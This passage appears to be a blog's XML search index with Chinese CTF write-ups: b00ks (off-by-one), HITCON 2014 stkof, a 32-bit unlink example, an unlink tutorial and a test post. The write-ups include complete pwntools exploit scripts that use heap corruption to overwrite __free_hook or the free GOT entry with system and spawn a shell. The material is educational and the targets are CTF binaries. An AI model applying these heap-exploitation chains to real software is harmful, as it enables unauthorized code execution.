", &amp;v1); ptr = malloc(v1); ...输入description，同样对大小无限制12345678910111213printf("\nEnter book description size: ", *&amp;v1);__isoc99_scanf("%d", &amp;v1);if ( v1 &gt;= 0 )&#123; v5 = malloc(v1); if ( v5 ) &#123; printf("Enter book description: ", &amp;v1); if ( input(v5, v1 - 1) ) &#123; printf("Unable to read description"); &#125; ...最后将name和description的指针存入结构体12345678910v3 = malloc(0x20uLL);if ( v3 )&#123; *(v3 + 6) = v1; *(off_202010 + v2) = v3; *(v3 + 2) = v5; *(v3 + 1) = ptr; *v3 = ++cnt; return 0LL;&#125;分析可得到结构体12345600000000 book struc ; (sizeof=0x20, mappedto_6)00000000 index dq ?00000008 name dq ?00000010 description dq ?00000018 size dq ?00000020 book endsdelete函数会将指针清零，不存在悬挂指针edit函数用于编辑book的descriptionprint函数输出ID、name、description、author，可以用来泄露信息change_name函数可以修改author name漏洞分析任意读写由于null byte off_by_one，在程序开头时，若输入32位的author name（unk_202040），那么&#39;\x00&#39;会溢出到book_list（unk_202060）中1234.data:0000000000202010 book_list dq offset unk_202060 ; DATA XREF: sub_B24:loc_B38↑o.data:0000000000202010 ; delete:loc_C1B↑o ....data:0000000000202018 author_name dq offset unk_202040 ; DATA XREF: change_name+15↑o.data:0000000000202018 ; print+CA↑o若是此时create一个book，那么新book的指针将会覆盖掉这个溢出的&#39;\x00&#39;，导致author name与book指针之间没有截断，意味着我可以通过输出author name来泄露出book的指针，也就是堆地址。1230x555555756040: 0x6161616161616161 0x6161616161616161 &lt;== author name0x555555756050: 0x6161616161616161 0x00616161616161610x555555756060: 0x0000555555757160 &lt;== book指针由于程序提供修改author name的函数，所以可以再次输入32位的author name，使溢出的&#39;\x00&#39;覆盖掉book指针的最低字节，导致book的指针所指向的地址变小。10x0000555555757160 ==&gt; 0x0000555555757100 //地址变小因为在create一个book时，会先申请name和description的空间，所以经过修改的book指针有可能就会指向地址偏小description的空间中1234567891011120x555555757000: 0x0000000000000000 0x0000000000000021 &lt;== name0x555555757010: 0x6161616161616161 0x00000000000000000x555555757020: 0x0000000000000000 0x0000000000000131 &lt;== description0x555555757030: 0x6262626262626262 0x00000000000000000x555555757040: 0x0000000000000000 0x0000000000000000 ......0x555555757100: 0x0000000000000000 0x0000000000000000 &lt;== 修改后的book指针，指向description中 ...... 0x555555757150: 0x0000000000000000 0x00000000000000310x555555757160: 0x0000000000000001 0x0000555555757010 &lt;== 修改前的book指针0x555555757170: 0x0000555555757030 0x00000000000001200x555555757180: 0x0000000000000000 0x0000000000020e81所以可以事先在description中伪造一个book结构体，当book指针被修改于此时，就可以对伪造的name和description进行读写，实现任意读写。泄露libc基址这道题由于开启PIE，并且没有uaf等常规方法来泄露libc，所以这里采用了一种更为巧妙的方法。在分配第二个book时，申请一个很大的空间，使堆以mmap模式进行拓展（可以参考这里）。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址123456789101112131415161718192021pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x56052bb62000 0x56052bb64000 r-xp 2000 0 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd63000 0x56052bd64000 r--p 1000 1000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd64000 0x56052bd65000 rw-p 1000 2000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052d944000 0x56052d965000 rw-p 21000 0 [heap] 0x7fd6affa0000 0x7fd6b015e000 r-xp 1be000 0 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b015e000 0x7fd6b035e000 ---p 200000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b035e000 0x7fd6b0362000 r--p 4000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0362000 0x7fd6b0364000 rw-p 2000 1c2000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0364000 0x7fd6b0369000 rw-p 5000 0 0x7fd6b0369000 0x7fd6b038c000 r-xp 23000 0 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b054d000 0x7fd6b0572000 rw-p 25000 0 &lt;==== mmap分配的空间 0x7fd6b058a000 0x7fd6b058b000 rw-p 1000 0 0x7fd6b058b000 0x7fd6b058c000 r--p 1000 22000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058c000 0x7fd6b058d000 rw-p 1000 23000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058d000 0x7fd6b058e000 rw-p 1000 0 0x7ffe6b361000 0x7ffe6b382000 rw-p 21000 0 [stack] 0x7ffe6b3bd000 0x7ffe6b3bf000 r--p 2000 0 [vvar] 0x7ffe6b3bf000 0x7ffe6b3c1000 r-xp 2000 0 [vdso]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]getshell因为PIE，所以很难采用覆写got表等方法。而已经泄露了libc，所以这里采用向__free_hook写入system来getshell漏洞利用输入32位的author name，create一个book1（name：0x20字节，description：0x120字节）调用show函数 泄露堆地址create book2（description为大空间：0x21000字节），准备泄露libc基址create book3（name写入&#39;/bin/sh\x00&#39;）为getshell做准备在book1-&gt;description中伪造book结构体，name指针为book2的description指针（即mmap分配空间的地址），description指针为book3中description指针的地址。（这里地址都可以由泄露的堆地址加上偏移得到）重新向author name中写入32个字节，使&#39;\x00&#39;覆盖掉book1指针的最低位字节，book1指针指向book1-&gt;description中布置好的book结构体调用show函数，通过book1的name的值得到mmap分配的地址，减去固定的偏移获得libc基址通过libc基址，计算出system和__free_hook的地址调用edit，修改book1的description，写入free_hook的地址，因为第（5）步，所以这里实际是将book3的description指针改为free_hook的地址调用edit，修改book3的description，写入system，因为第（9）步，所以这里实际是把system写入__free_hook中调用delete(book3)，因为事先在name写入的&#39;/bin/sh\x00&#39;，所以成功getshell我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#-*- coding=utf-8 -*-from pwn import *context.log_level = 'debug'p = process('b00ks')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def create(name, description): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Enter book name size: ') p.sendline(str(len(name))) p.recvuntil('Enter book name (Max 32 chars): ') p.send(name) p.recvuntil('Enter book description size: ') p.sendline(str(len(description))) p.recvuntil('Enter book description: ') p.send(description)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('id you want to delete: ') p.sendline(str(index))def edit(index, description): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('id you want to edit: ') p.sendline(str(index)) p.recvuntil('new book description: ') p.sendline(description)def show(): p.recvuntil('&gt; ') p.sendline('4')def change_name(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('Enter author name: ') p.sendline(name)def leak(addr1, addr2): payload = 'b'*0xc0 + p64(1) + p64(addr1) + p64(addr2) + p64(0x120) edit(1, payload) change_name('a'*32) show() p.recvuntil('Name: ') res = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) return res#泄露堆地址p.recvuntil('Enter author name: ')p.sendline('a'*32)create('a'*0x20, 'b'*0x120)show()p.recvuntil('Author: ')heap_addr = u64(p.recvuntil('\n')[32:-1].ljust(8, '\x00'))print "heap_addr: %#x" % heap_addr#申请一个大内存，让堆以mmap模式进行拓展，进而泄露libc_basecreate('a'*0x20, '\x00'*0x21000)create('/bin/sh\x00', 'b'*0x8)#heap_addr+0x70是以mmap拓展的堆的地址，将他写入伪造的book结构体的name中，准备泄露该值#heap_addr_0xe0是chunk3的description指针，为之后任意写做准备libc_base = leak(heap_addr+0x70, heap_addr+0xe0) - 0x5AD010 #该值需要根据系统修改print "libc_base: %#x" % libc_base#计算地址system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']print "system: %#x" % systemprint "free_hook: %#x" % free_hook#之前将chunk3的description指针的地址写到了伪造chunk的description指针处，所以这里将改写chunk3的description指针的值为free_hook#因为off_one_byte会导致写入时会多往后覆盖一个字节，导致后方的book-&gt;size被覆盖为0，所以这里手动多写一个字节'\x08'，以免size被覆盖为0edit(1, p64(free_hook)+'\x08')#向free_hook中写入systemedit(3, p64(system))#事先已经在chunk3的name中放入了/bin/sh\x00delete(3)p.interactive()相关链接题目链接：b00ks]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>堆利用</tag>
        <tag>ctfwiki</tag>
        <tag>off_by_one</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2014-stkof writeup]]></title>
    <url>%2Fpost%2Fe7616071.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2014知识点：unlink这道题没有菜单显示，只能通过分析代码来了解程序功能。功能：添加（输入：长度）修改（输入：索引、长度、内容）删除（输入：索引）程序保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE程序分析add函数中，对分配chunk的大小没有限制，将指针存到全局数组中，可获得指针变量的地址set函数中，12345678910111213141516171819202122232425262728293031signed __int64 set()&#123; signed __int64 result; // rax int i; // eax unsigned int v2; // [rsp+8h] [rbp-88h] __int64 n; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v2 = atol(&amp;s); if ( v2 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v2] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); n = atoll(&amp;s); ptr = ::s[v2]; for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; if ( n ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125;对写入的长度没有限制，存在堆溢出，所以可以利用unlink漏洞delete函数中，释放掉堆块并把指针清零0由于程序中没有可以用来输出数据的函数，于是考虑将puts函数覆写到其他函数的got表（这里选择free函数）漏洞利用分配连续4个chunk（编号1-4），大小为0x80（smallchunk）（通常尽量多申请一个chunk，以隔开top chunk，防止被合并）在chunk1中构造fake chunk，准备unlinkprevsize：0size：0x80fd：chunk_ptr - 0x18bk：chunk_ptr - 0x10注意：chunk_ptr是指向chunk0的指针变量所在的地址，而非指针指向的地址从chunk1继续溢出到chunk2，修改prevsize、size（inuse位）prevsize: 0x80size：0x90释放chunk2，触发unlink，此后chunk1的指针的值被修改为了chunk_ptr-0x18把free的got表修改为puts。payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))使用DynELF泄露system（详见代码）利用（5）的方法，再将free的got表修改为system向chunk3中写入/bin/sh\x00，释放chunk3，getshell我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./stkof')elf = ELF('./stkof')free_got = elf.got['free']puts = elf.symbols['puts']def add(size): p.sendline('1') p.sendline(str(size)) p.recvuntil('OK\n')def set(index, content): p.sendline('2') p.sendline(str(index)) p.sendline(str(len(content))) p.send(content) p.recvuntil('\n')def delete(index): p.sendline('3') p.sendline(str(index))def leak(addr): payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(addr) set(1, payload) delete(2) res = p.recvuntil('OK\n').split('\x0aOK')[0] if res == '': res = '\x00' return res #返回值可以为任意长度，并不清楚原因chunk_ptr = 0x602148add(0x80)add(0x80)add(0x80)add(0x80)#unlinkpayload = p64(0) + p64(0x0)payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)payload += 'a' * 0x60payload += p64(0x80) + p64(0x90)set(1, payload)delete(2)p.recvuntil('OK\n')#freegot写为putspayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))#leakd = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#freegot写为systempayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(system))#getshellset(3, '/bin/sh\x00')delete(3)p.interactive()相关链接题目链接：stkof相关题目：unlink例题unlink漏洞分析：堆利用学习之unlink]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink例题]]></title>
    <url>%2Fpost%2F503970b4.html</url>
    <content type="text"><![CDATA[题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。知识点：unlink123456nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap1.Add chunk2.Set chunk3.Delete chunk4.Print chunk5.Exit程序分析其中，add函数没有对申请的chunk大小做限制。在set函数中：123456789101112ssize_t set()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, "Set chunk index:", 0x10u); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 ) return write(1, "Set chunk data error!\n", 0x16u); write(1, "Set chunk data:", 15u); return read(0, buf[v1], 0x400u);&#125;可以发现代码中没有对写入的长度做限制，存在溢出同时，buf[]中储存指向chunk的指针，且为全局变量，可以获得地址由此确定程序中存在unlink漏洞在delete函数中：123456789101112void delete()&#123; int v0; // [esp+Ch] [ebp-Ch] v0 = -1; write(1, "Delete chunk index:", 0x13u); __isoc99_scanf("%d", &amp;v0); if ( v0 &gt;= 0 ) free(buf[v0]); else write(1, "Delete chunk error!\n", 0x14u);&#125;释放chunk后没有对指针赋0，会造成UAF漏洞，但此题不会利用到。在print函数中，可输出任意index的chunk，用于泄露数据。由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读漏洞利用分配3个连续的chunk，大小为0x80（smallchunk）chunk0、chunk1: 用于构造unlinkchunk2：用于防止被top chunk合并在chunk0中构造fake chunk，准备unlink。prevsize：0size：0x80fd：chunk_ptr - 0xcbk：chunk_ptr - 0x8注意：chunk_ptr是指向chunk0的指针变量所在的地址，即&amp;buf[0]，而非指针指向的地址从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）prevsize: 0x80size：0x88释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc写入chunk0，构造leak函数，准备利用DynELF来泄露system，由于指针被修改，实际写入地址是chunk_ptr-0xc。payload = &#39;a&#39; * 0xc //paddingpayload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用payload += p32(addr) //将addr写入chunk1的指针(buf[1])此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取利用DynELF泄露出system函数地址利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将system的地址写入free的got表向chunk2中写入&#39;/bin/sh\x00&#39;，调用free(chunk2)，因为free被覆盖为system，所以实际调用system(chunk2)，成功getshell我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *elf = ELF('heap')free_got = elf.got['free']chunk_ptr = 0x8049d60#p = process('heap')p = remote('127.0.0.1', 4000)def add_chunk(size): p.recvuntil('5.Exit\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chunk(index, data): p.recvuntil('5.Exit\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(data)def delete_chunk(index): p.recvuntil('5.Exit\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def print_chunk(index): p.recvuntil('5.Exit\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index)) return p.recvline()def leak(addr): payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(addr) set_chunk(0, payload) res = print_chunk(1)[:4] print "leaking: %#x ---&gt; %s" % (addr, res.encode('hex')) return res add_chunk(128)add_chunk(128)add_chunk(128)set_chunk(2, '/bin/sh\x00')#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bkpayload = p32(0) + p32(0x80) + p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)set_chunk(0, payload)#free第二个chunk，将会触发unlinkdelete_chunk(1)#泄露system的地址d = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#将free_got的地址覆盖掉第二个chunk的地址payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(free_got)set_chunk(0, payload)#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址set_chunk(1, p32(system))#调用free，实际调用systemdelete_chunk(2)p.interactive()注意set_chunk函数中最后应该用send而非sendline，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值此题为32位程序，若是64位应将p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)改为p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10)相关链接题目链接：heapHITCON CTF 2014-stkof]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之unlink]]></title>
    <url>%2Fpost%2Fdbc7b210.html</url>
    <content type="text"><![CDATA[原理unlink是内存操作中的一个宏， 用来从双向链表中取出一个free chunk，其过程中的指针操作存在任意写的漏洞。从双向链表中取出节点的过程，若是学过数据结构应该都比较清楚，主要代码是：12P-&gt;fd-&gt;bk = P-&gt;bkP-&gt;bk-&gt;fd = P-&gt;fd但是在unlink宏中，为了安全性还增加了一些检查：unlink源码：1234567891011if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD;...&#125;要利用该漏洞，先要绕过这里的两处检查（64位为例）第一处检查chunksize(P) != prev_size (next_chunk(P))，检查下一个chunk的prevsize是否等于当前chunk的size，所以需要通过溢出等手段设置下一chunk的prevsize第二处检查__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)，检查当前chunk是否是前一个chunk的后继，同时也是后一个chunk的前驱，也就是检查链表是否真的是链接好的。但是这个检查有个致命的缺点:因为FD-&gt;bk == *(FD+0x18)、BK-&gt;fd == *(BK+0x10)若在FD中存入&amp;P-0x18，那么表达式将变为FD-&gt;bk == *((&amp;P-0x18)+0x18) == *&amp;P == P若在BK中存入&amp;P-0x10，那么表达式将变为BK-&gt;fd == *((&amp;P-0x10)+0x10) == *&amp;P == P从而就绕过了检查注意：&amp;P是表示指向目标chunk的指针的地址绕过检查后，满足FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P，所以有：12FD-&gt;bk = BK; // P = &amp;P-0x10BK-&gt;fd = FD; // P = &amp;P-0x18在此之后，P就指向了比自己的地址低0x18个字节的位置，可以通过再次向P写入从而覆盖掉P本身，将其修改为任意地址，第三次向P写入则实现了任意地址写。触发前提堆指针是全局变量，或其地址是可泄露的能够free一个smallchunk或largechunk(可以是伪造的)能够控制下一chunk的prevsize和size利用过程（64位为例）法一存在堆溢出时：分配连续3个chunk a, b, c在a中伪造chunkp64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + padding覆盖b的prevsize和size，修改inuse位，使之可以与a合并p64(0x80) + p64(0x90)free掉b，触发unlink写入a，覆盖指针为任意地址，p64(0)*3 + p64(addr)再次写入a，任意地址写入法二不能溢出，但有double free分配连续3个fastchunk a, b, c释放a，此时并不会修改后面的inuse位和prevsize申请一个大内存，触发fastbin合并，这时会将fastbin中的a取出放入unsortedbin，可以实现对b的inuse位进行修改触发double free，将a再次释放，放入fastbin再申请与a相同大小的chunk，就会从fastbin中将a返回，同时不会改变b的inuse布置a内存，释放b，触发unlink题目一道典型的unlink例题HITCON CTF 2014-stkofHITCON CTF 2016-SleepyHolder]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2Fpost%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[这是一个测试1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello world"); return 0;&#125;]]></content>
  </entry>
</search>
